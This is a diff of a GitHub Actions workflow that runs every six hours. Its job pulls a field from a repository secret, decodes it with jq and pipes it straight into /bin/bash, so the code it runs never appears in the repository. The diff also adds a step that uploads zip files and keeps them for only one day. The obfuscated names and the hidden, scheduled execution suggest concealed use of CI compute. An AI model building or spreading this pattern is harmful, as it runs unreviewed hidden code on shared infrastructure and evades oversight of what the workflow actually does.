@@ -1,25 +1,24 @@
 name: changruizhongfa
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '17 0/6 * * *'
 
-jobs:  # 31368
+  schedule:
+    - cron: '56 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: changruizhongfa
         env:
-          ju328: ${{ secrets.ju328 }}
+          mjiq3347: ${{ secrets.mjiq3347 }}
         run: |
-          echo $ju328 | jq -r .gwr6 | /bin/bash
-          echo $u6 | jq -r .y8 | /bin/bash
-          echo $ohkp0502 | jq -r .a8204 | /bin/bash
-          echo $gx21263 | jq -r .ky42 | /bin/bash
-          echo $etvxh39999 | jq -r .pvdfm948 | /bin/bash
-          echo $wdyt39 | jq -r .ntxek4645 | /bin/bash
-          echo $ezbn67262 | jq -r .ouapl130 | /bin/bash
-          echo $pjdx6409 | jq -r .g49978 | /bin/bash
+          printf '%s' "$mjiq3347" | jq -r .dmh30687 | /bin/bash
+          printf '%s' "$nm09695" | jq -r .xkq7409 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2OZ7objB
+          path: "*.zip"
+          retention-days: 1
